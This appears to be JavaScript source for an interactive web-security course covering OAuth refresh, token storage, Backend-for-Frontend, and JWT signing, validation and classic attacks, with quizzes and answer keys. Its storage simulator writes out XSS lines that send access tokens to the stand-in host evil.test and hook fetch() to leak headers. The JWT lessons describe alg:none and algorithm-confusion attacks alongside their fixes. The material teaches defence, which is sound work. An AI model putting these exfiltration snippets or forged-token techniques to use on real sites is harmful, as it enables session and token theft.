  if (q.get('grant_type') !== 'refresh_token') errs.push('Body needs <code>grant_type=refresh_token</code>');
  if (q.get('refresh_token') !== 'rt_8xKq2LmZ0pW') errs.push('Body needs <code>refresh_token=rt_8xKq2LmZ0pW</code>');
  if (q.get('client_id') !== 'shop-spa') errs.push('A public client identifies itself with <code>client_id=shop-spa</code>');
  if (i < 0) errs.push('Put a blank line between headers and body');
  $('#fb').className = 'fb ' + (errs.length ? 'bad' : 'ok');
  $('#fb').innerHTML = errs.length ? '❌ ' + errs.join('<br>❌ ') : '✅ A valid RFC 6749 §6 refresh request. With rotation, the response will contain a NEW refresh_token: store it and discard the old one.';
};
</script>`;

  // =====================================================================
  // token-storage-bff
  // =====================================================================
  const storageSim = CSS + `
<div class="row"><b>Where does the SPA keep its token?</b></div>
<div class="row" id="opts"></div>
<div class="g2">
  <div class="card">
    <h4>Try it</h4>
    <div class="row"><button data-x="steal">💉 XSS: steal the token</button><button data-x="ride">💉 XSS: call API from the page</button></div>
    <div class="row"><button data-x="reload">🔄 reload page</button><button data-x="tab">🗗 open new tab</button><button data-x="later">⏳ next day, from attacker's PC</button><button data-x="csrf">🌐 evil.test posts a form</button></div>
    <pre class="dark" id="code" style="min-height:80px"></pre>
    <div id="res"></div>
  </div>
  <div class="card">
    <h4>Summary for this option</h4>
    <table class="t" id="sum"></table>
  </div>
</div>
<script>
` + H + `
const O = {
  ls: { name: 'localStorage', code: { steal: "fetch('https://evil.test/c?t=' + localStorage.getItem('access_token'))", ride: "fetch('/api/orders', {headers:{Authorization:'Bearer '+localStorage.access_token}})" },
    steal: [0, 'Token read and sent to evil.test. Attacker can use it from anywhere until it expires.'], ride: [0, 'Works.'], reload: [1, 'Still there.'], tab: [1, 'Shared by all tabs of the origin.'],
    later: [0, 'The stolen token (and a refresh token, if stored too!) works from the attacker\\'s machine.'], csrf: [1, 'Not sent automatically, so no CSRF.'] },
  ss: { name: 'sessionStorage', code: { steal: "fetch('https://evil.test/c?t=' + sessionStorage.getItem('access_token'))", ride: "fetch('/api/orders', {headers:{Authorization:'Bearer '+sessionStorage.access_token}})" },
    steal: [0, 'Same as localStorage: any script on the page can read it.'], ride: [0, 'Works.'], reload: [1, 'Survives reload of the same tab.'], tab: [2, 'Each tab has its own copy: new tab = log in again (or silent re-auth).'],
    later: [0, 'Stolen token still usable until exp.'], csrf: [1, 'Not sent automatically, so no CSRF.'] },
  mem: { name: 'JS memory (closure / worker)', code: { steal: "// token lives in a closure inside the auth module\\n// harder, but the script can monkey-patch fetch():\\nconst f = window.fetch; window.fetch = (u, o) => { leak(o.headers); return f(u, o); }", ride: "fetch('/api/orders') // the app's own wrapper adds the token" },
    steal: [2, 'Not directly readable, but malicious code can hook fetch() or the auth library and capture it on next use.'], ride: [0, 'Works while the page is open.'], reload: [2, 'Gone on reload: needs a silent re-auth or a refresh token stored elsewhere.'], tab: [2, 'Not shared.'],
    later: [2, 'Only if it managed to hook and leak it.'], csrf: [1, 'No CSRF.'] },
  ck: { name: 'HttpOnly cookie (token in cookie)', code: { steal: "document.cookie  // → ''  (HttpOnly cookies are invisible to JS)", ride: "fetch('/api/orders', {credentials:'include'}) // browser attaches the cookie" },
    steal: [1, 'JavaScript cannot read HttpOnly cookies.'], ride: [0, 'The browser still attaches the cookie to requests the script makes: "session riding" while the page is open.'], reload: [1, 'Persists.'], tab: [1, 'Shared.'],
    later: [1, 'Nothing was stolen, so the attack ends when the page is closed / the XSS is fixed.'], csrf: [2, 'Cookies are sent automatically: needs SameSite + CSRF defences. And the API must be same-site to receive the cookie.'] },
  bff: { name: 'BFF: tokens on the server, browser has only a session cookie', code: { steal: "document.cookie        // → ''  (__Host-sid is HttpOnly)\\nlocalStorage.length    // → 0\\n// the access & refresh tokens never reached the browser", ride: "fetch('/bff/api/orders', {headers:{'X-CSRF':'1'}}) // BFF adds the token" },
    steal: [1, 'There is no token in the browser to steal. Refresh tokens never leave the server.'], ride: [0, 'Session riding still works while the page is open: XSS is still bad, but contained.'], reload: [1, 'Session cookie persists.'], tab: [1, 'Shared.'],
    later: [1, 'Nothing portable was stolen. Logout / session revoke stops everything.'], csrf: [2, '__Host- cookie + SameSite=Strict + a custom header the BFF requires.'] },
};
const ICON = ['😱', '✅', '⚠️'];
const ACTS = [['steal', 'XSS can steal a portable token'], ['ride', 'XSS can use it while the page is open'], ['reload', 'Survives reload'], ['tab', 'Shared across tabs'], ['later', 'Attacker keeps access later'], ['csrf', 'CSRF exposure']];
let cur = 'ls';
$('#opts').innerHTML = Object.keys(O).map((k) => '<label><input type="radio" name="o" value="' + k + '"' + (k === cur ? ' checked' : '') + '> ' + O[k].name + '</label>').join(' ');
function sum() { $('#sum').innerHTML = ACTS.map((a) => '<tr><td>' + a[1] + '</td><td>' + ICON[O[cur][a[0]][0]] + ' ' + esc(O[cur][a[0]][1]) + '</td></tr>').join(''); }
function act(x) {
  const o = O[cur];
  $('#code').textContent = o.code[x] ? '// attacker script running in the page' + NL + o.code[x] : '// ' + x;
  $('#res').innerHTML = '<div class="fb ' + (o[x][0] === 1 ? 'ok' : 'bad') + '">' + ICON[o[x][0]] + ' ' + esc(o[x][1]) + '</div>';
}
document.querySelectorAll('[data-x]').forEach((b) => (b.onclick = () => act(b.dataset.x)));
document.querySelectorAll('[name=o]').forEach((r) => (r.onchange = () => { cur = r.value; sum(); act('steal'); }));
sum();
act('steal');
</script>`;

  const bffFlow = CSS + `
<div id="flow"></div>
<script>
` + H + `
const verifier = Auth.randB64url(32), challenge = Auth.sha256b64url(verifier), state = Auth.randB64url(12), code = Auth.randB64url(16), sid = Auth.randB64url(24);
const at = Auth.jwtSign({ alg: 'HS256', typ: 'at+jwt' }, { sub: 'alice', aud: 'https://api.shop.test', scope: 'orders:read', exp: NOW + 900 }, 'k');
const rt = 'rt_' + Auth.randB64url(20);
const enc = encodeURIComponent;
const authUrl = 'https://idp.shop.test/authorize?response_type=code&client_id=shop-bff&redirect_uri=' + enc('https://app.shop.test/bff/callback') +
  '&scope=' + enc('openid orders:read offline_access') + '&state=' + state + '&code_challenge=' + challenge + '&code_challenge_method=S256';
const cookie = 'Set-Cookie: __Host-sid=' + sid + '; Path=/; Secure; HttpOnly; SameSite=Strict';
const A = [
  { id: 'b', label: 'Browser (SPA)', icon: '🌐', store: {}, storeLabel: 'Browser: cookies / JS storage' },
  { id: 'f', label: 'BFF app.shop.test', icon: '🧱', store: {}, storeLabel: 'BFF server-side session' },
  { id: 'i', label: 'idp.shop.test', icon: '🔑', store: {}, storeLabel: 'IdP' },
  { id: 'a', label: 'api.shop.test', icon: '🛒', store: {}, storeLabel: 'API' },
];
const loggedIn = { b: { cookie: '__Host-sid=' + sid.slice(0, 8) + '… (HttpOnly)', 'JS-visible tokens': 'none' }, f: { [sid.slice(0, 8) + '…']: 'alice, AT (15 min), RT' } };
const A2 = A.map((x) => Object.assign({}, x, { store: loggedIn[x.id] || {} }));
const apiCall = { from: 'b', to: 'f', label: 'GET /bff/api/orders  Cookie: __Host-sid', msg: ['GET /bff/api/orders HTTP/1.1', 'Host: app.shop.test', 'Cookie: __Host-sid=' + sid, 'X-CSRF: 1'].join(NL), hl: ['Cookie', 'X-CSRF'],
  note: 'Same-origin request to the BFF. The cookie is attached automatically; the custom <code>X-CSRF</code> header is an extra CSRF defence (cross-site forms cannot set it).' };
const proxy = { from: 'f', to: 'a', label: 'GET /orders  Authorization: Bearer AT', msg: ['GET /orders HTTP/1.1', 'Host: api.shop.test', 'Authorization: Bearer ' + at.slice(0, 40) + '…'].join(NL), hl: ['Authorization'],
  note: 'The BFF looks up the session and attaches the access token. The token only exists server-side.' };
const apiOk = { from: 'a', to: 'f', kind: 'res', label: '200 OK', msg: ['HTTP/1.1 200 OK', 'Content-Type: application/json', '', '[{"id":101,"total":42}]'].join(NL) };
const toB = { from: 'f', to: 'b', kind: 'res', label: '200 OK (just the JSON)', msg: ['HTTP/1.1 200 OK', 'Content-Type: application/json', '', '[{"id":101,"total":42}]'].join(NL) };
Seq.mount('#flow', {
  title: 'Backend-for-Frontend: the browser never sees a token',
  actors: A,
  scenarios: [
    { name: '🔐 Login', steps: [
      { from: 'b', to: 'f', label: 'GET /bff/login', msg: ['GET /bff/login HTTP/1.1', 'Host: app.shop.test'].join(NL), note: 'The SPA just navigates to the BFF. No OAuth code in the browser.' },
      { from: 'f', to: 'b', kind: 'redirect', label: '302 → IdP /authorize (PKCE, state)', msg: ['HTTP/1.1 302 Found', 'Location: ' + authUrl, 'Set-Cookie: __Host-login=' + state + '; Path=/; Secure; HttpOnly; SameSite=Lax'].join(NL), hl: ['code_challenge', 'state'],
        set: { f: { pending: 'state + code_verifier' } }, note: 'The BFF is a <b>confidential OAuth client</b>. It keeps the PKCE <code>code_verifier</code> (OAuth section explains PKCE).' },
      { from: 'b', to: 'i', label: 'GET /authorize?… (user logs in)', msg: ['GET ' + authUrl.replace('https://idp.shop.test', '') + ' HTTP/1.1', 'Host: idp.shop.test'].join(NL) },
      { from: 'i', to: 'b', kind: 'redirect', label: '302 → /bff/callback?code=…', msg: ['HTTP/1.1 302 Found', 'Location: https://app.shop.test/bff/callback?code=' + code + '&state=' + state].join(NL), hl: ['code='] },
      { from: 'b', to: 'f', label: 'GET /bff/callback?code=…&state=…', msg: ['GET /bff/callback?code=' + code + '&state=' + state + ' HTTP/1.1', 'Host: app.shop.test', 'Cookie: __Host-login=' + state].join(NL) },
      { from: 'f', to: 'i', kind: 'back', label: 'POST /token (code + verifier + client secret)', msg: ['POST /token HTTP/1.1', 'Host: idp.shop.test', 'Authorization: Basic ' + Auth.b64('shop-bff:bff-secret'), 'Content-Type: application/x-www-form-urlencoded', '',
        'grant_type=authorization_code&code=' + code + '&redirect_uri=' + enc('https://app.shop.test/bff/callback') + '&code_verifier=' + verifier].join(NL), hl: ['code_verifier', 'Authorization'],
        note: 'Back-channel, server to server. The browser is not involved.' },
      { from: 'i', to: 'f', kind: 'back', label: 'access_token + refresh_token + id_token', msg: ['HTTP/1.1 200 OK', 'Content-Type: application/json', '', JSON.stringify({ access_token: at.slice(0, 20) + '…', token_type: 'Bearer', expires_in: 900, refresh_token: rt, id_token: 'eyJ…' }, null, 2)].join(NL),
        set: { f: { pending: null, [sid.slice(0, 8) + '…']: 'alice, AT (15 min), RT' } } },
      { from: 'f', to: 'b', kind: 'redirect', label: '302 / + Set-Cookie __Host-sid (HttpOnly)', msg: ['HTTP/1.1 302 Found', 'Location: /', cookie].join(NL), hl: ['HttpOnly', 'SameSite=Strict', '__Host-'],
        set: loggedIn, note: 'The browser gets only an opaque, HttpOnly session cookie. <code>__Host-</code> prefix = must be Secure, Path=/, no Domain.' },
    ]},
    { name: '📡 API call', actors: A2, steps: [apiCall, { from: 'f', to: 'f', label: 'session → access token' }, proxy, apiOk, toB] },
    { name: '🔄 Token expired: BFF refreshes', actors: A2, steps: [apiCall,
      { from: 'f', to: 'f', label: 'AT expired' },
      { from: 'f', to: 'i', kind: 'back', label: 'POST /token grant_type=refresh_token', msg: ['POST /token HTTP/1.1', 'Host: idp.shop.test', 'Authorization: Basic ' + Auth.b64('shop-bff:bff-secret'), 'Content-Type: application/x-www-form-urlencoded', '', 'grant_type=refresh_token&refresh_token=' + rt].join(NL) },
      { from: 'i', to: 'f', kind: 'back', label: 'new AT + rotated RT', msg: ['HTTP/1.1 200 OK', '', '{"access_token":"eyJ…","expires_in":900,"refresh_token":"rt_…new"}'].join(NL), set: { f: { [sid.slice(0, 8) + '…']: 'alice, AT2 (15 min), RT2' } } },
      proxy, apiOk, Object.assign({}, toB, { note: 'The SPA never knew a refresh happened.' })] },
    { name: '💉 XSS in the SPA', actors: A2, steps: [
      { from: 'b', to: 'b', label: 'injected script looks for tokens', badge: 'XSS', msg: ['document.cookie          // ""  (HttpOnly)', 'localStorage.length      // 0', 'sessionStorage.length    // 0'].join(NL),
        note: 'Nothing to exfiltrate.' },
      Object.assign({}, apiCall, { label: 'script calls /bff/api/orders itself', note: 'But the script <b>can</b> make requests from the page, and the browser attaches the cookie.' }),
      proxy, apiOk,
      Object.assign({}, toB, { label: '200 OK (attacker reads data in-page)', note: 'XSS is still dangerous (session riding while the tab is open), but the attacker cannot take a token home. Fix XSS and revoke the session, and it is over.' }),
    ]},
  ],
});
</script>`;

  const cookieExercise = (solved) => CSS + `
<div class="card">
  <h4>Write the BFF's session cookie header</h4>
  <div class="mut">Cookie name must use the strictest prefix, value <code>q8Zr2LkP0w</code>. JS must not read it, it must only travel over HTTPS, it must not be sent on cross-site requests, and it must apply to the whole site.</div>
  <input id="t" style="width:100%;box-sizing:border-box;margin-top:6px" value="${solved ? 'Set-Cookie: __Host-sid=q8Zr2LkP0w; Path=/; Secure; HttpOnly; SameSite=Strict' : 'Set-Cookie: sid=q8Zr2LkP0w; Domain=shop.test; Path=/'}">
  <button id="chk" style="margin-top:6px">Check</button>
  <div id="fb" class="fb"></div>
</div>
<script>
` + H + `
$('#chk').onclick = () => {
  let v = $('#t').value.trim();
  const errs = [];
  if (!/^set-cookie:/i.test(v)) errs.push('Start with <code>Set-Cookie:</code>');
  v = v.replace(/^set-cookie:\\s*/i, '');
  const parts = v.split(';').map((s) => s.trim()).filter(Boolean);
  const [nv] = parts;
  const attrs = parts.slice(1).map((a) => a.toLowerCase());
  const has = (a) => attrs.some((x) => x === a || x.startsWith(a + '='));
  if (!/^__Host-[A-Za-z0-9_-]+=q8Zr2LkP0w$/.test(nv || '')) errs.push('Name it with the <code>__Host-</code> prefix, e.g. <code>__Host-sid=q8Zr2LkP0w</code>');
  if (!has('secure')) errs.push('<code>Secure</code>: HTTPS only (also required by __Host-)');
  if (!has('httponly')) errs.push('<code>HttpOnly</code>: JavaScript cannot read it');
  if (!attrs.includes('samesite=strict') && !attrs.includes('samesite=lax')) errs.push('<code>SameSite=Strict</code> (or Lax): not sent on cross-site requests');
  if (!attrs.includes('path=/')) errs.push('<code>Path=/</code> (required by __Host-)');
  if (has('domain')) errs.push('Remove <code>Domain</code>: __Host- cookies must be host-only');
  $('#fb').className = 'fb ' + (errs.length ? 'bad' : 'ok');
  $('#fb').innerHTML = errs.length ? '❌ ' + errs.join('<br>❌ ') : '✅ A locked-down session cookie: host-only, HTTPS-only, invisible to JS, not sent cross-site.';
};
</script>`;

  // =====================================================================
  window.LESSONS.push(
    {
      id: 'jwt-anatomy',
      section: '4 · Tokens & JWT',
      title: 'JWT anatomy',
      explain: `
<p>A <strong>JSON Web Token</strong> (JWT, RFC 7519) is a compact, URL-safe string carrying <em>claims</em> (statements like "subject is user_42, expires at 10:15"), protected by a signature. It looks like this:</p>
<pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzQyIiwiZXhwIjoxNzkzNDQ4OTAwfQ.Xk3f…
└──────── header ───────────────────┘ └──────────── payload ─────────────────────────┘ └ signature</code></pre>
<ol>
  <li><strong>Header</strong>: JSON like <code>{"alg":"HS256","typ":"JWT"}</code>, Base64url-encoded.</li>
  <li><strong>Payload</strong>: JSON claims, Base64url-encoded.</li>
  <li><strong>Signature</strong>: <code>sign(base64url(header) + "." + base64url(payload))</code> with the algorithm in <code>alg</code>.</li>
</ol>
<p>Analogy: a festival wristband with your details printed on it and a hologram seal. Anyone can read the print. Only the organiser can make the hologram, and changing the print breaks it.</p>
<h3>Registered claims (RFC 7519 §4.1)</h3>
<ul>
  <li><code>iss</code> issuer · <code>sub</code> subject · <code>aud</code> audience (string or array)</li>
  <li><code>exp</code> expiration · <code>nbf</code> not before · <code>iat</code> issued at: <strong>NumericDate</strong> = seconds since 1970 (not milliseconds!)</li>
  <li><code>jti</code> unique token id</li>
</ul>
<p>Everything else (<code>name</code>, <code>scope</code>, <code>roles</code>) is a public or private claim your system defines.</p>
<div class="warn"><strong>Signed is not encrypted.</strong> A normal JWT is a JWS (RFC 7515): the payload is only Base64url-encoded, readable by anyone who sees the token. Never put secrets in it. If the payload must be confidential, use JWE (RFC 7516, five parts).</div>
<div class="tip">"JWT" is the format; it says nothing about how you use it. Access tokens (RFC 9068 uses <code>typ: "at+jwt"</code>), OpenID Connect ID tokens and many session tokens are all JWTs with different rules.</div>`,
      examples: [
        { title: 'JWT encoder / decoder (real HS256)', code: jwtLab },
        { title: 'Signed, not encrypted: read vs tamper', code: signedNotEncrypted },
      ],
      quiz: [
        { q: 'How many dot-separated parts does a signed JWT (JWS compact form) have?', options: ['2', '3', '4', '5'], answer: 1, why: 'header.payload.signature. JWE compact form has 5.' },
        { q: 'You find <code>"password":"hunter2"</code> in a JWT payload. Why is that bad?', options: ['It makes the token too long', 'Anyone holding the token can Base64url-decode and read it', 'Passwords break the signature', 'It is fine because the token is signed'], answer: 1, why: 'Signing gives integrity, not confidentiality.' },
        { q: 'Which value is a correct <code>exp</code> for 15 minutes after 2026-10-31 12:00:00 UTC?', options: ['1793448900', '1793448900000', '"2026-10-31T12:15:00Z"', '900'], answer: 0, why: 'NumericDate is seconds since the epoch: 1793448000 + 900.' },
        { q: 'An attacker changes <code>"role":"user"</code> to <code>"admin"</code> in the payload but keeps the signature. What happens at a correctly configured API?', options: ['Accepted', 'Rejected: the signature no longer matches the new header.payload', 'Accepted until exp', 'The API re-signs it'], answer: 1, why: 'The signature covers the exact encoded header and payload.' },
        { q: 'Which claim says which API the token is meant for?', options: ['iss', 'sub', 'aud', 'jti'], answer: 2, why: 'aud (audience) identifies the intended recipient(s).' },
      ],
      exercise: {
        task: `<p>Edit the header and payload in the box below so the Orders API accepts the token, then click <strong>Check</strong>. The starter has two classic mistakes.</p>`,
        starter: anatomyExercise(false),
        hint: 'Add "aud": "https://api.shop.test", set iat to the "now" shown, and use seconds (10 digits) for exp: now + 900.',
        solution: anatomyExercise(true),
      },
    },
    {
      id: 'jwt-signing',
      section: '4 · Tokens & JWT',
      title: 'Signing: HS256 vs RS256/ES256, JWKS & kid',
      explain: `
<p>The <code>alg</code> header names how the signature was made (RFC 7518). Two families matter:</p>
<ul>
  <li><strong>Symmetric, HS256</strong> (HMAC-SHA256): one shared secret both signs and verifies. Simple and fast. But every verifier can also <em>mint</em> tokens, so the secret must be shared with everyone who verifies.</li>
  <li><strong>Asymmetric, RS256 / PS256 / ES256 / EdDSA</strong>: the issuer signs with a <strong>private key</strong>, and anyone verifies with the matching <strong>public key</strong>. APIs can verify but never forge. RS256 = RSA PKCS#1 v1.5 + SHA-256, ES256 = ECDSA P-256 (much smaller signatures).</li>
</ul>
<p>Analogy: HS256 is a shared house key: anyone with a copy can also lock and unlock. RS256 is a wax seal stamp: only the king has the stamp, but everyone knows what the real seal looks like.</p>
<h3>Distributing public keys: JWKS</h3>
<pre><code class="language-json">GET https://idp.shop.test/.well-known/jwks.json
{
  "keys": [
    { "kty": "RSA", "use": "sig", "alg": "RS256", "kid": "2026-10-rsa",
      "n": "0vx7agoebGcQSuuPiLJXZptN9nndrQmbXEps2aiAFbWhM78LhWx…", "e": "AQAB" }
  ]
}</code></pre>
<ul>
  <li>A <strong>JWK Set</strong> (RFC 7517) is a JSON list of public keys. Its URL is usually advertised as <code>jwks_uri</code> in the IdP's OpenID discovery document.</li>
  <li>Each token header carries a <code>kid</code> (key ID) so the verifier knows which key to use.</li>
  <li>APIs cache the JWKS (honour <code>Cache-Control</code>) and refetch, rate-limited, when they see an unknown <code>kid</code>.</li>
</ul>
<h3>Key rotation without downtime</h3>
<p>Publish the new key → wait for caches → start signing with it → wait for old tokens to expire → remove the old key. During the overlap the JWKS holds two keys.</p>
<div class="warn">Never take the key from the token itself (<code>jku</code>, <code>x5u</code>, <code>jwk</code> headers) unless you strictly allow-list it. Otherwise an attacker signs with their own key and tells you where to find it.</div>`,
      examples: [
        { title: 'HS256 (real HMAC) vs asymmetric signing (toy RSA with BigInt)', code: hsVsRs },
        { title: 'JWKS: fetch, pick key by kid, rotate', code: jwksFlow,
          explain: `
<details><summary>The problem: how do 20 APIs get the IdP's public key, and survive key changes?</summary>
<p>Hard-coding a public key in every service means a coordinated redeploy for every rotation, and if the IdP rotates first, every API starts rejecting tokens. JWKS + <code>kid</code> makes it self-service: the IdP publishes keys at a well-known URL, tokens say which key signed them, APIs fetch and cache.</p>
</details>
<details><summary>Step by step: the "🔄 Key rotation" scenario</summary>
<table>
<tr><th>Step</th><th>What happens</th><th>State after</th></tr>
<tr><td>1</td><td>IdP generates 2026-10-rsa and <b>publishes</b> it, still signs with 2026-07</td><td>IdP published: both keys</td></tr>
<tr><td>2–3</td><td>API cache expires, refetches JWKS, gets both keys</td><td>API cache: both keys</td></tr>
<tr><td>4</td><td>IdP switches signing to 2026-10-rsa</td><td>IdP signing: 2026-10</td></tr>
<tr><td>5–7</td><td>New token (kid 2026-10-rsa) → key already cached → verify ✓ → 200</td><td>no extra fetch needed</td></tr>
<tr><td>8–10</td><td>An older token (kid 2026-07-rsa) still in use → old key still cached → ✓ → 200</td><td></td></tr>
<tr><td>11</td><td>After the max token lifetime, IdP unpublishes 2026-07</td><td>IdP published: 2026-10 only</td></tr>
</table>
</details>
<details><summary>Key ideas</summary>
<ul>
<li><code>kid</code> is only a <em>lookup hint</em>. Trust comes from the fact that the key is in the JWKS of the issuer you configured.</li>
<li>Unknown kid → refetch once (rate-limited) → still unknown → <code>401 invalid_token</code> (❌ scenario).</li>
<li>The RS256 signatures in this demo are simulated (marked in the code); the HS256 and toy-RSA math in the first example is real.</li>
</ul>
</details>
<details><summary>Try this</summary>
<ul>
<li>In <b>✅ Cold cache</b> watch the API state card: empty until step 4, then it holds the key, and steps 6–8 need no fetch.</li>
<li>In <b>🔄 Key rotation</b> watch the IdP card: "published" changes <em>before</em> "signing" does.</li>
<li>Click the JWKS response arrow and look at <code>n</code>: 342 Base64url characters = a 2048-bit modulus.</li>
</ul>
</details>` },
      ],
      quiz: [
        { q: 'Why might a company with 15 microservices prefer RS256/ES256 over HS256?', options: ['Smaller tokens', 'Services only need the public key, so a compromised service cannot mint tokens', 'HS256 is deprecated', 'RS256 does not need a kid'], answer: 1, why: 'With HS256 every verifier holds the signing secret.' },
        { q: 'What is the <code>kid</code> header for?', options: ['It is the key itself', 'It tells the verifier which key in the JWKS to use', 'It encrypts the payload', 'It is the user id'], answer: 1, why: 'Key ID selects among multiple published keys, which makes rotation possible.' },
        { q: 'In a safe rotation, when do you remove the old public key from the JWKS?', options: ['Immediately after generating the new key', 'Before publishing the new key', 'After all tokens signed with the old key have expired', 'Never'], answer: 2, why: 'Tokens signed with the old key must stay verifiable until they expire.' },
        { q: 'A token header contains <code>"jku":"https://evil.test/keys.json"</code>. What should the API do?', options: ['Fetch the keys from there', 'Ignore it and use only the configured issuer\'s JWKS', 'Accept the token without verification', 'Convert it to HS256'], answer: 1, why: 'Keys must come from a trusted, pre-configured source.' },
      ],
      exercise: {
        task: `<p>Number the key-rotation steps in a safe order in the box below and click <strong>Check</strong>. The checker tells you what would break with your order.</p>`,
        starter: rotationExercise(false),
        hint: 'Publish first, sign later. Unpublish last.',
        solution: rotationExercise(true),
      },
    },
    {
      id: 'jwt-validation',
      section: '4 · Tokens & JWT',
      title: 'Validating JWTs & classic attacks',
      explain: `
<p>Decoding a JWT takes one line. <strong>Validating</strong> it takes a checklist, and every famous JWT vulnerability comes from skipping one item. Follow RFC 8725 (JWT Best Current Practices):</p>
<ol>
  <li><strong>Pin the algorithm.</strong> Decide on the server (e.g. only <code>RS256</code>). Never let the token's <code>alg</code> header choose. Reject <code>none</code>.</li>
  <li><strong>Verify the signature</strong> with a key from a trusted source (your issuer's JWKS, selected by <code>kid</code>).</li>
  <li><strong>Check time</strong>: <code>exp</code> in the future, <code>nbf</code> in the past (allow a small clock skew, e.g. 30–60 s).</li>
  <li><strong>Check <code>iss</code></strong> exactly equals your trusted issuer.</li>
  <li><strong>Check <code>aud</code></strong> contains <em>your</em> API.</li>
  <li>Optionally check <code>typ</code> (e.g. <code>at+jwt</code>) so an ID token cannot be used as an access token.</li>
  <li>Only <em>then</em> authorize using <code>scope</code>/<code>roles</code>.</li>
</ol>
<h3>Classic attacks</h3>
<ul>
  <li><strong><code>alg: none</code></strong>: the "unsecured JWT" with an empty signature. Old libraries accepted it as valid.</li>
  <li><strong>Algorithm confusion (RS256 → HS256)</strong>: the server is configured with the RSA <em>public</em> key. The attacker signs an HS256 token using that public key as the HMAC secret. A library that obeys the header computes HMAC with the same key and gets a match.</li>
  <li><strong>Missing <code>aud</code> check</strong>: a token issued for the Billing API works on the Orders API.</li>
  <li><strong>Weak HS256 secrets</strong>: brute-forced offline from a single captured token.</li>
  <li><strong>Header-supplied keys</strong> (<code>jku</code>, <code>x5u</code>, <code>jwk</code>) and <strong><code>kid</code> injection</strong> (kid used in a file path or SQL query).</li>
</ul>
<pre><code class="language-javascript">// Node, jose library
const JWKS = createRemoteJWKSet(new URL('https://idp.shop.test/.well-known/jwks.json'));
const { payload } = await jwtVerify(token, JWKS, {
  algorithms: ['RS256'],              // ① pin the algorithm
  issuer: 'https://idp.shop.test',    // ② exact iss
  audience: 'https://api.shop.test',  // ③ my API
  clockTolerance: 30,                 // ④ seconds of skew for exp/nbf
});</code></pre>
<div class="warn"><code>jwt.decode()</code> does <strong>not</strong> verify anything. Use it only for debugging, never for authentication.</div>`,
      examples: [
        { title: 'JWT attack simulator: pick a token, toggle the checks', code: attackSim,
          explain: `
<details><summary>The problem: one missing check = full bypass</summary>
<p>Each attack token in the simulator is crafted to slip through exactly one gap. With all checks on, every attack is rejected. With "naive library defaults" (signature + exp only, header alg trusted), <code>alg:none</code>, algorithm confusion, future <code>nbf</code>, wrong <code>aud</code> and wrong <code>iss</code> are all <strong>accepted as admin or as a user of another system</strong>.</p>
</details>
<details><summary>Step by step: the trace for "🦹 alg confusion" with naive defaults</summary>
<table>
<tr><th>#</th><th>Trace line</th><th>Why</th></tr>
<tr><td>1</td><td>✅ parse 3 parts</td><td>It is a well-formed JWT</td></tr>
<tr><td>2</td><td>⚠️ alg allow-list: OFF → trusts header alg "HS256"</td><td>The token chooses the algorithm</td></tr>
<tr><td>3</td><td>⚠️ signature: HMAC-SHA256(key = configured PUBLIC KEY PEM, input) matches</td><td>The attacker computed exactly this HMAC, because the public key is public. Real HMAC, computed live</td></tr>
<tr><td>4–7</td><td>exp/nbf/iss/aud ✅ or ⏭ (OFF)</td><td>The attacker simply wrote valid claims</td></tr>
<tr><td>→</td><td>ACCEPT → request runs as alice (role admin) 😱</td><td></td></tr>
</table>
<p>Now tick <b>pin algorithm</b>: line 2 becomes ❌ <code>alg allow-list [RS256]: header says "HS256"</code> and the verdict is REJECT.</p>
</details>
<details><summary>Key ideas</summary>
<ul>
<li>The <strong>server</strong> decides the algorithm and the key. The token's header is attacker-controlled input.</li>
<li>Signature checks prove <em>who</em> issued it; claim checks prove it is meant for <em>you</em>, <em>now</em>. You need both.</li>
<li>Check order matters only for which error you report. All checks must pass.</li>
</ul>
</details>
<details><summary>Try this</summary>
<ul>
<li>Click <b>Naive library defaults</b>, then walk through every token in the dropdown. Count how many attacks get in.</li>
<li>Click <b>All on (secure)</b> and do the same: only the legit token passes.</li>
<li>Select "payload edited, old signature" and untick only <b>verify signature</b>: anyone is admin.</li>
<li>Select "meant for another API" and untick <b>check aud</b>.</li>
</ul>
</details>` },
        { title: 'Algorithm confusion, step by step', code: algConfusionFlow,
          explain: `
<details><summary>Key lines: the bug and the fix</summary>
<pre><code class="language-javascript">jwt.verify(token, publicKeyPem);                            // ① vulnerable
jwt.verify(token, publicKeyPem, { algorithms: ['RS256'] }); // ② fixed</code></pre>
<ol>
<li><strong>①</strong> The library reads <code>alg</code> from the header. For <code>HS256</code> it treats <code>publicKeyPem</code> as an HMAC secret. The attacker knows that string (step 2), so their HMAC (step 3) matches (step 5).</li>
<li><strong>②</strong> The allowed algorithm comes from the server. <code>HS256</code> is not allowed → reject (fixed scenario, step 5). Modern libraries also refuse to use an RSA key for HMAC at all.</li>
</ol>
</details>` },
      ],
      quiz: [
        { q: 'What is the core fix for both <code>alg:none</code> and RS256→HS256 confusion?', options: ['Longer tokens', 'The server pins the allowed algorithm(s) instead of trusting the header', 'Base64 instead of Base64url', 'Shorter exp'], answer: 1, why: 'Both attacks rely on the token choosing how it is verified.' },
        { q: 'A token is validly signed by your IdP, but <code>aud</code> is <code>https://billing.shop.test</code>. Your Orders API should…', options: ['Accept: same IdP', 'Reject: it was issued for another API', 'Accept if scope matches', 'Re-sign it'], answer: 1, why: 'Audience restriction stops tokens for one service being replayed at another.' },
        { q: 'In algorithm confusion, what does the attacker use as the HMAC secret?', options: ['The IdP private key', 'The server\'s RSA public key, which is public', 'A brute-forced password', 'The kid'], answer: 1, why: 'The public key is downloadable from the JWKS; a confused library uses the same bytes as an HMAC key.' },
        { q: 'Which call is safe to use for authentication?', options: ['<code>jwt.decode(token)</code>', '<code>jwtVerify(token, JWKS, { algorithms, issuer, audience })</code>', '<code>JSON.parse(atob(token.split(".")[1]))</code>', 'Checking only <code>exp</code>'], answer: 1, why: 'Only verification with pinned algorithm, issuer and audience is authentication.' },
      ],
      exercise: {
        task: `<p>The API runs all checks in the order alg → signature → exp → nbf → iss → aud. For each token in the box below, pick the <strong>first</strong> check that rejects it (or "none: ACCEPT"), then click <strong>Check</strong>.</p>`,
        starter: validationExercise(false),
        hint: 'Read the order carefully: a token can have several problems, but only the first failing check is reported. aud may be an array. iss is compared as an exact string.',
        solution: validationExercise(true),
      },
    },
    {
      id: 'sessions-vs-jwt',
      section: '4 · Tokens & JWT',
      title: 'Sessions vs JWTs',
      explain: `
<p>Both answer "who is this request from?". The difference is <strong>where the truth lives</strong>.</p>
<ul>
  <li><strong>Server session</strong>: the browser holds a random id (a coat-check ticket). The server holds the data. Delete the server row and the ticket is worthless immediately.</li>
